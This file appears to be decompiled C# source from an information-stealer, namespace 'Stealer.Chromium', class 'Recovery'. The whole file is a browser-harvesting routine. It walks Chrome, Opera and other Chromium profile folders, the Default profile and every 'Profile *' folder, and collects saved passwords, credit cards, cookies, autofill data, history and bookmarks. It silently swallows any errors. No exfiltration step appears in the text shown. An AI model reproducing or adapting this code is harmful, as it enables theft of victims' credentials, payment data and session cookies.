using System;
using System.IO;

namespace Stealer.Chromium
{
	// Token: 0x02000024 RID: 36
	internal sealed class Recovery : Browser
	{
		// Token: 0x060000A9 RID: 169 RVA: 0x00007220 File Offset: 0x00005420
		public Recovery()
		{
			this.type = "Chrome";
		}

		// Token: 0x060000AA RID: 170 RVA: 0x00007238 File Offset: 0x00005438
		protected override void Load()
		{
			base.Load();
			try
			{
				foreach (string text in Paths.sChromiumPswPaths)
				{
					bool flag = text.Contains("Opera Software");
					string text2;
					if (flag)
					{
						text2 = Paths.appdata + text;
					}
					else
					{
						text2 = Paths.lappdata + text;
					}
					string text3 = text2 + "Default";
					bool flag2 = Directory.Exists(text3);
					if (flag2)
					{
						this.pCreditCards.AddRange(CreditCards.Get(text3 + "\\Web Data"));
						this.pPasswords.AddRange(Passwords.Get(text3 + "\\Login Data"));
						this.pCookies.AddRange(Cookies.Get(text3 + "\\Network\\Cookies"));
						this.pHistory.AddRange(History.Get(text3 + "\\History"));
						this.pAutoFill.AddRange(Autofill.Get(text3 + "\\Web Data"));
						this.pBookmarks.AddRange(Bookmarks.Get(text3 + "\\Bookmarks"));
					}
					bool flag3 = Directory.Exists(text2);
					if (flag3)
					{
						foreach (string text4 in Directory.GetDirectories(text2, "Profile *"))
						{
							this.pCreditCards.AddRange(CreditCards.Get(text4 + "\\Web Data"));
							this.pPasswords.AddRange(Passwords.Get(text4 + "\\Login Data"));
							this.pCookies.AddRange(Cookies.Get(text4 + "\\Network\\Cookies"));
							this.pHistory.AddRange(History.Get(text4 + "\\History"));
							this.pAutoFill.AddRange(Autofill.Get(text4 + "\\Web Data"));
							this.pBookmarks.AddRange(Bookmarks.Get(text4 + "\\Bookmarks"));
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
	}
}
